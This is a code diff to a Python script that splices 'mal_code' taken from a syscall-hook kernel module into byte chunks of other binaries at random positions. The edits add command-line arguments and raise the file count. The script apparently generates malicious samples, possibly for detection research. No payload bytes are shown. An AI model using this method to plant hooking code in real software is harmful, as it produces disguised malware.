@@ -1,17 +1,22 @@
 # Usage #
-# python connecting_byte.py 
+# python autoconnecting.py <.csv file> <file_start_point>
 
 import numpy as np
 import struct
 import random
+import sys
 
-ELF_SIZE = 16
-FILE_NUM = 5
+ELF_SIZE = 20
+FILE_NUM = 25
 FILE_BYTE = 1440
 BYTE_SIZE = 700
 THRESHOLD = 600
 HEADER1_LOCATE = 112
 END_OF_MAL = 351
+
+def main():
+    print("Cannot create any more files. Exit...")
+    return 0
 
 def cutting_func(byte, start, end):
     cutting = []
@@ -60,7 +65,7 @@ def insert_zero(index):
 
 if __name__ == '__main__':
     # byte1: free,  byte2: syscall_hook.ko
-    entry = np.loadtxt('data_kallsyms.csv', delimiter=',', dtype='int')
+    entry = np.loadtxt(sys.argv[1], delimiter=',', dtype='int')
     print("length of ep: {0}".format(len(entry)))
     file1 = raw_input('file1: ')
     f1 = open(file1, "rb")
@@ -77,7 +82,7 @@ if __name__ == '__main__':
         byte2.append(ord(data2[i]))
 
     ep = 0  # entry pointer, common in all files 
-    for file_num in xrange(FILE_NUM):
+    for file_num in range(int(sys.argv[2]), int(sys.argv[2]) + FILE_NUM):
         if ep > len(entry):
             print("No more entry!")
             break
@@ -125,11 +130,15 @@ if __name__ == '__main__':
 
         print("cutting_num = {0}, total_byte = {1}"
               .format(cutting_num, len(connecting)))
-
+        if len(connecting) == 112:
+            sys.exit(main())
+            
         # Insert mal_code into random locate between functions
         print("Inserting mal_code...")
-        if cutting_num == 2:
+        if cutting_num == 1:
             mal_locate = 0
+        elif cutting_num == 2:
+            mal_locate = random.randint(0, 1)
         else:
             mal_locate = random.randint(0, cutting_num-2)
         cutting_mal = cutting_mal_func(byte2)
